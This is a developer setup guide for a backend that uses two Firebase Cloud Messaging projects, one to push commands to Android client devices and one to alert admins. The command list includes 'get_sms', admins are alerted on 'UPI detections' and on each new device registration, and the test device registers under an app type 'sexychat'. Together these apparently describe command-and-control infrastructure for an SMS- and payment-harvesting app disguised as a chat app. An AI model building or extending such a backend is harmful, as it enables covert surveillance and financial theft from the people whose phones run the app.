# Firebase Setup Guide

Complete guide for setting up Firebase Cloud Messaging (FCM) for both device commands and admin notifications.

---

## Table of Contents

1. [Overview](#overview)
2. [Architecture](#architecture)
3. [Device Firebase Setup](#device-firebase-setup)
4. [Admin Firebase Setup](#admin-firebase-setup)
5. [Backend Configuration](#backend-configuration)
6. [Testing](#testing)
7. [Troubleshooting](#troubleshooting)

---

## Overview

This system uses **two separate Firebase projects**:

1. **Device Firebase** - Send commands to client devices
2. **Admin Firebase** - Send notifications to admin devices

### Why Two Projects?

**Security & Functionality:**
- Separate credentials for devices vs admins
- Different access control policies
- Independent scaling and monitoring
- Clear separation of concerns

**Use Cases:**

**Device Firebase:**
- Send remote commands (ping, get SMS, etc.)
- Control device behavior
- Request data from devices

**Admin Firebase:**
- Notify admins of new devices
- Alert on UPI detections
- Push notifications for events

---

## Architecture

```
???????????????????????????????????????????????????????????????
?                     Backend Server                           ?
???????????????????????????????????????????????????????????????
?                                                               ?
?  ??????????????????????????    ??????????????????????????  ?
?  ?  firebase_service.py   ?    ? firebase_admin_service ?  ?
?  ?  (Device Commands)     ?    ?  (Admin Notifications) ?  ?
?  ??????????????????????????    ??????????????????????????  ?
?              ?                              ?                ?
?              ?                              ?                ?
?  ??????????????????????????    ??????????????????????????  ?
?  ? device-firebase-       ?    ? admin-firebase-        ?  ?
?  ? adminsdk.json          ?    ? adminsdk.json          ?  ?
?  ??????????????????????????    ??????????????????????????  ?
?              ?                              ?                ?
????????????????????????????????????????????????????????????????
               ?                              ?
               ?                              ?
      ??????????????????            ??????????????????
      ? Firebase       ?            ? Firebase       ?
      ? Project 1      ?            ? Project 2      ?
      ? (Devices)      ?            ? (Admins)       ?
      ??????????????????            ??????????????????
               ?                              ?
               ?                              ?
      ??????????????????            ??????????????????
      ? Android        ?            ? Admin's        ?
      ? Client Devices ?            ? Mobile Devices ?
      ??????????????????            ??????????????????
```

---

## Device Firebase Setup

### Step 1: Create Firebase Project

1. Go to [Firebase Console](https://console.firebase.google.com/)
2. Click **"Add project"**
3. **Project name:** `Device Management System`
4. **Google Analytics:** Optional (can disable)
5. Click **"Create project"**

### Step 2: Add Android App

1. In Firebase Console, click **"Add app"** ? **Android**
2. **Android package name:** `com.example.devicemanager` (your app's package name)
3. **App nickname:** `Device Client`
4. **Debug signing certificate:** Optional
5. Click **"Register app"**
6. Download `google-services.json`
7. Place in your Android app's `app/` directory

### Step 3: Enable Cloud Messaging

1. In Firebase Console, go to **"Project settings"** (gear icon)
2. Navigate to **"Cloud Messaging"** tab
3. Note the **"Server key"** (for reference)
4. Ensure **"Cloud Messaging API (Legacy)"** is enabled

### Step 4: Generate Service Account Key

1. In Firebase Console, go to **"Project settings"** ? **"Service accounts"**
2. Click **"Generate new private key"**
3. Confirm by clicking **"Generate key"**
4. Save the downloaded JSON file as:
   ```
   device-firebase-adminsdk.json
   ```
5. **?? Important:** Keep this file secure, never commit to git

### Step 5: Place Service Account File

Copy the file to your backend root:
```bash
# In your backend directory
cp /path/to/downloaded-key.json device-firebase-adminsdk.json
```

**Project Structure:**
```
backend/
??? app/
??? device-firebase-adminsdk.json  ? Place here
??? admin-firebase-adminsdk.json
??? run.py
??? ...
```

---

## Admin Firebase Setup

### Step 1: Create Second Firebase Project

1. Go to [Firebase Console](https://console.firebase.google.com/)
2. Click **"Add project"**
3. **Project name:** `Admin Notification System`
4. **Google Analytics:** Optional
5. Click **"Create project"**

### Step 2: Add Android/iOS App

**For Admin Mobile App:**

1. Click **"Add app"** ? **Android** (or iOS)
2. **Android package name:** `com.example.adminapp`
3. **App nickname:** `Admin Mobile`
4. Click **"Register app"**
5. Download `google-services.json` (Android) or `GoogleService-Info.plist` (iOS)
6. Place in your admin mobile app project

### Step 3: Enable Cloud Messaging

1. Go to **"Project settings"** ? **"Cloud Messaging"**
2. Ensure **"Cloud Messaging API (Legacy)"** is enabled
3. Note the **"Server key"**

### Step 4: Generate Service Account Key

1. Go to **"Project settings"** ? **"Service accounts"**
2. Click **"Generate new private key"**
3. Save as:
   ```
   admin-firebase-adminsdk.json
   ```
4. **?? Keep secure**

### Step 5: Place Service Account File

```bash
cp /path/to/admin-key.json admin-firebase-adminsdk.json
```

**Final Structure:**
```
backend/
??? app/
??? device-firebase-adminsdk.json  ? Device commands
??? admin-firebase-adminsdk.json   ? Admin notifications
??? run.py
??? ...
```

---

## Backend Configuration

### File Locations

Both service account files must be in the **backend root directory**:

```
/workspace/
??? device-firebase-adminsdk.json
??? admin-firebase-adminsdk.json
??? app/
    ??? services/
    ?   ??? firebase_service.py
    ?   ??? firebase_admin_service.py
    ??? ...
```

### Firebase Service (Device Commands)

**File:** `app/services/firebase_service.py`

```python
class FirebaseService:
    def __init__(self, service_account_file: str):
        try:
            if "device_app" not in [app.name for app in firebase_admin._apps.values()]:
                cred = credentials.Certificate(service_account_file)
                self.app = firebase_admin.initialize_app(cred, name="device_app")
            else:
                self.app = firebase_admin.get_app("device_app")
        except Exception as e:
            logger.error(f"? Firebase Service initialization error: {e}")
            self.app = None

# Initialize
firebase_service = FirebaseService("device-firebase-adminsdk.json")
```

**Features:**
- Send commands to devices
- Uses FCM tokens from device registration
- App name: `"device_app"`

### Firebase Admin Service (Admin Notifications)

**File:** `app/services/firebase_admin_service.py`

```python
class FirebaseAdminService:
    def __init__(self, service_account_file: str):
        try:
            if "admin_app" not in [app.name for app in firebase_admin._apps.values()]:
                cred = credentials.Certificate(service_account_file)
                self.app = firebase_admin.initialize_app(cred, name="admin_app")
            else:
                self.app = firebase_admin.get_app("admin_app")
        except Exception as e:
            logger.error(f"? Firebase Admin Service initialization error: {e}")
            self.app = None

# Initialize
firebase_admin_service = FirebaseAdminService("admin-firebase-adminsdk.json")
```

**Features:**
- Send notifications to admins
- Uses FCM tokens from admin login
- App name: `"admin_app"`

### Environment Variables (Optional)

You can also configure via environment variables:

```env
# .env file
DEVICE_FIREBASE_CREDENTIALS=device-firebase-adminsdk.json
ADMIN_FIREBASE_CREDENTIALS=admin-firebase-adminsdk.json
```

Update services:
```python
import os

firebase_service = FirebaseService(
    os.getenv("DEVICE_FIREBASE_CREDENTIALS", "device-firebase-adminsdk.json")
)

firebase_admin_service = FirebaseAdminService(
    os.getenv("ADMIN_FIREBASE_CREDENTIALS", "admin-firebase-adminsdk.json")
)
```

### .gitignore

**?? CRITICAL:** Ensure Firebase files are ignored by git:

```gitignore
# Firebase credentials
device-firebase-adminsdk.json
admin-firebase-adminsdk.json
*-firebase-adminsdk*.json
```

---

## Testing

### Test Device Firebase

**1. Send Test Command:**

```python
import requests

# Login as admin
response = requests.post("http://localhost:8000/auth/login", json={
    "username": "admin",
    "password": "password"
})
temp_token = response.json()["temp_token"]

# Verify OTP
response = requests.post("http://localhost:8000/auth/verify-2fa", json={
    "username": "admin",
    "otp_code": "123456",
    "temp_token": temp_token
})
access_token = response.json()["access_token"]

# Send command to device
headers = {"Authorization": f"Bearer {access_token}"}
response = requests.post(
    "http://localhost:8000/api/devices/abc123/command",
    headers=headers,
    json={"command": "ping"}
)

print(response.json())
# Expected: {"success": true, "message": "Command sent successfully"}
```

**2. Check Device Logs:**

On Android device, check if FCM message received:
```java
// In your FirebaseMessagingService
@Override
public void onMessageReceived(RemoteMessage remoteMessage) {
    Log.d("FCM", "Command received: " + remoteMessage.getData().get("command"));
}
```

### Test Admin Firebase

**1. Register Device with Admin FCM Token:**

```python
# During admin login
response = requests.post("http://localhost:8000/auth/verify-2fa", json={
    "username": "admin",
    "otp_code": "123456",
    "temp_token": temp_token,
    "fcm_token": "YOUR_ADMIN_DEVICE_FCM_TOKEN"
})
```

**2. Register New Device (Trigger Notification):**

```python
response = requests.post("http://localhost:8000/register", json={
    "type": "register",
    "device_id": "test123",
    "device_info": {
        "model": "Test Device",
        "manufacturer": "Test",
        "os_version": "Android 13",
        "battery": 100
    },
    "user_id": "admin_device_token",
    "app_type": "sexychat"
})
```

**3. Check Admin Mobile Device:**

Should receive push notification:
```
?? New Device Registered
Test Device (SexyChat)
```

### Test Commands

**Device Firebase Commands:**
```bash
# Ping device
curl -X POST "http://localhost:8000/api/devices/abc123/command" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"command":"ping"}'

# Get SMS
curl -X POST "http://localhost:8000/api/devices/abc123/command" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"command":"get_sms"}'
```

**Check Logs:**
```bash
# Backend logs
tail -f logs/app.log | grep "FCM"

# Should see:
# ?? FCM command sent to device: abc123
# ? Message sent successfully
```

---

## Troubleshooting

### Common Issues

#### 1. "Firebase credentials file not found"

**Error:**
```
FileNotFoundError: device-firebase-adminsdk.json not found
```

**Solution:**
- Verify file exists in backend root
- Check file name matches exactly
- Ensure no extra spaces or characters

```bash
ls -la *.json
# Should show:
# device-firebase-adminsdk.json
# admin-firebase-adminsdk.json
```

#### 2. "Permission denied" or "Invalid credentials"

**Error:**
```
google.auth.exceptions.DefaultCredentialsError: Could not automatically determine credentials
```

**Solution:**
- Re-download service account key
- Verify JSON file is valid:
```bash
python -c "import json; json.load(open('device-firebase-adminsdk.json'))"
```
- Check file permissions:
```bash
chmod 600 device-firebase-adminsdk.json
chmod 600 admin-firebase-adminsdk.json
```

#### 3. "App name already exists"

**Error:**
```
ValueError: Firebase app 'device_app' already exists
```

**Solution:**
- Already initialized (not an error)
- Restart server:
```bash
pkill -f "python run.py"
python run.py
```

#### 4. FCM Token Invalid

**Error:**
```
messaging.UnregisteredError: Requested entity was not found
```

**Solutions:**
- Device FCM token expired/invalid
- Re-register device to get new token
- Check device app is running
- Verify device has internet connection

#### 5. Message Not Received

**Device:**
- Check FCM token saved correctly
- Verify device app is running
- Check Android notification permissions
- Review device logs

**Admin:**
- Check FCM token saved during login
- Verify admin mobile app configured correctly
- Check notification permissions
- Review Firebase Console ? Cloud Messaging

#### 6. Wrong Firebase Project

**Error:**
```
messaging.SenderIdMismatchError: Token is from a different project
```

**Solution:**
- Verify using correct `google-services.json`
- Check FCM token belongs to correct project
- Ensure device/admin apps use corresponding Firebase projects

### Debug Mode

Enable debug logging:

```python
# In firebase_service.py and firebase_admin_service.py
import logging
logging.basicConfig(level=logging.DEBUG)

logger.setLevel(logging.DEBUG)
```

Check logs:
```bash
tail -f logs/app.log
```

### Firebase Console Debugging

**Device Firebase:**
1. Go to Firebase Console ? Device Project
2. Navigate to **"Cloud Messaging"**
3. Click **"Send test message"**
4. Enter device FCM token
5. Send test notification

**Admin Firebase:**
1. Go to Firebase Console ? Admin Project
2. Same process with admin FCM token

### Verify Configuration

**Check Firebase Initialization:**
```python
# In Python shell
from app.services.firebase_service import firebase_service
from app.services.firebase_admin_service import firebase_admin_service

print(firebase_service.app)  # Should print app object
print(firebase_admin_service.app)  # Should print app object
```

**Check FCM Tokens:**
```python
# In MongoDB
db.devices.find_one({"device_id": "abc123"}, {"fcm_tokens": 1})
# Should have FCM token array

db.admins.find_one({"username": "admin"}, {"fcm_tokens": 1})
# Should have FCM token array
```

---

## Best Practices

### Security

1. **Never commit service account files**
   ```gitignore
   *-firebase-adminsdk*.json
   ```

2. **Use environment variables in production**
   ```bash
   export DEVICE_FIREBASE_CREDENTIALS=/secure/path/device.json
   export ADMIN_FIREBASE_CREDENTIALS=/secure/path/admin.json
   ```

3. **Restrict file permissions**
   ```bash
   chmod 600 *.json
   chown backend-user:backend-group *.json
   ```

4. **Rotate keys periodically**
   - Generate new service account keys every 90 days
   - Update backend configuration
   - Delete old keys from Firebase Console

### Performance

1. **Batch messages** when possible
   ```python
   # Send to multiple devices
   messaging.send_multicast(MulticastMessage(
       tokens=fcm_tokens,
       data={"command": "ping"}
   ))
   ```

2. **Handle token expiry**
   ```python
   try:
       messaging.send(message)
   except messaging.UnregisteredError:
       # Remove invalid token
       await remove_fcm_token(device_id, token)
   ```

3. **Monitor quota**
   - Firebase free tier: 10GB/month
   - Monitor usage in Firebase Console

### Monitoring

1. **Firebase Console Analytics**
   - Track message delivery rates
   - Monitor errors
   - View usage statistics

2. **Backend Logging**
   ```python
   logger.info(f"?? FCM sent to device: {device_id}")
   logger.error(f"? FCM failed: {error}")
   ```

3. **Error Tracking**
   - Log all FCM errors
   - Alert on high failure rates
   - Monitor token expiry trends

---

## Production Deployment

### Docker Setup

**Dockerfile:**
```dockerfile
FROM python:3.10

# Copy Firebase credentials
COPY device-firebase-adminsdk.json /app/
COPY admin-firebase-adminsdk.json /app/

# Ensure permissions
RUN chmod 600 /app/*-firebase-adminsdk.json

# ... rest of Dockerfile
```

**docker-compose.yml:**
```yaml
services:
  backend:
    build: .
    volumes:
      - ./device-firebase-adminsdk.json:/app/device-firebase-adminsdk.json:ro
      - ./admin-firebase-adminsdk.json:/app/admin-firebase-adminsdk.json:ro
    environment:
      - DEVICE_FIREBASE_CREDENTIALS=/app/device-firebase-adminsdk.json
      - ADMIN_FIREBASE_CREDENTIALS=/app/admin-firebase-adminsdk.json
```

### Kubernetes Setup

**Secret:**
```yaml
apiVersion: v1
kind: Secret
metadata:
  name: firebase-credentials
type: Opaque
data:
  device-firebase-adminsdk.json: <base64-encoded-content>
  admin-firebase-adminsdk.json: <base64-encoded-content>
```

**Deployment:**
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: backend
spec:
  template:
    spec:
      containers:
      - name: backend
        volumeMounts:
        - name: firebase-creds
          mountPath: /app/firebase-credentials
          readOnly: true
      volumes:
      - name: firebase-creds
        secret:
          secretName: firebase-credentials
```

---

## Summary

### Checklist

**Device Firebase:**
- [ ] Created Firebase project
- [ ] Added Android app
- [ ] Downloaded service account key
- [ ] Placed as `device-firebase-adminsdk.json`
- [ ] Added to `.gitignore`
- [ ] Tested command sending

**Admin Firebase:**
- [ ] Created separate Firebase project
- [ ] Added admin mobile app
- [ ] Downloaded service account key
- [ ] Placed as `admin-firebase-adminsdk.json`
- [ ] Added to `.gitignore`
- [ ] Tested push notifications

**Backend:**
- [ ] Both files in backend root
- [ ] Services initialized correctly
- [ ] Logs show successful initialization
- [ ] Commands work
- [ ] Notifications work

---

**Last Updated:** November 2, 2025  
**Version:** 2.0.0
